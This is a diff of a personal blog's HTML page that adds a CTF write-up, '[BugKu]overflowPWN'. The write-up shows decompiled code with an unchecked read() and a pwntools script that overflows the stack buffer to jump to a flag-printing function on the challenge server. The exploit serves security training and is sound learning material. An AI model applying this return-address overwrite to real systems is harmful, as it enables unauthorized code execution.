@@ -153,50 +153,141 @@
     }
 </script>
             <div class="main">
-                <div class="post-wrap archive">
-                    
-                        
-                            <h3>
-                                2021
-                            </h3>
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                [BugKu]overflowPWN
+                            </h1>
                             
-                                
-                                    <article class="archive-item">
-                                        <a class="archive-item-link" href="https://shawr00t.github.io/bugkuoverflowpwn/">
-                                            [BugKu]overflowPWN
-                                        </a><span class="archive-item-date">2021-06-28 </span></article>
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        「配枪朱丽叶 - 分部。」
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-06-28</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">0.8
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">151</a></span>
                                     
-                                        
+                                        <span class="post-category">
+                                Category:
                                 
-                                    <article class="archive-item">
-                                        <a class="archive-item-link" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
-                                            [攻防世界]PWN-level0
-                                        </a><span class="archive-item-date">2021-06-28 </span></article>
-                                    
-                                        
+                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
                                 
-                                    <article class="archive-item">
-                                        <a class="archive-item-link" href="https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/">
-                                            [攻防世界]hello_pwn
-                                        </a><span class="archive-item-date">2021-06-26 </span></article>
-                                    
+                            </span>
                                         
+                                </div>
                                 
-                                    <article class="archive-item">
-                                        <a class="archive-item-link" href="https://shawr00t.github.io/pwn-huan-jing-da-jian/">
-                                            PWN环境搭建
-                                        </a><span class="archive-item-date">2021-06-25 </span></article>
+                        </header>
+                        
+                        <div class="post-content">
+                            <p>checksec看了下，四个保护都没有开。<br>
+main中代码如下：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [rsp+0h] [rbp-30h]
+
+  memset(&amp;s, 0, 0x30uLL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  puts(&quot;say something?&quot;);
+  read(0, &amp;s, 0x100uLL);
+  puts(&quot;oh,that's so boring!&quot;);
+  return 0;
+}
+</code></pre>
+<p>还看到了直接获取flag的get_shell_函数，地址是0x400751：</p>
+<pre><code class="language-c">int get_shell_()
+{
+  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);
+  puts(&quot;this is your flag!&quot;);
+  return system(&quot;cat flag&quot;);
+}
+</code></pre>
+<p>可以利用read函数溢出让返回地址为0x400751，exp如下：</p>
+<pre><code class="language-python">from pwn import *
+
+p = remote('114.67.246.176',16081)
+payload = 'a'*0x30+'a'*0x8+p64(0x400751)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+                        </div>
+                        
+                                
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>「配枪朱丽叶 - 分部。」</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://shawr00t.github.io/bugkuoverflowpwn/">https://shawr00t.github.io/bugkuoverflowpwn/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                                            
-                </div>
-                <div class="pagination-container">
-                    
-                                            
+                                                
                                                     
-                                                            
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/bugkuoverflowpwn/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=qzone&title=[BugKu]overflowPWN&pics=https://shawr00t.github.io/images/avatar.png?v=1624889999978&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=weibo&title=[BugKu]overflowPWN + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1624889999978 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
+                                                pwn
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
+                                                                                                    [攻防世界]PWN-level0
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -252,5 +343,8 @@
                 
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
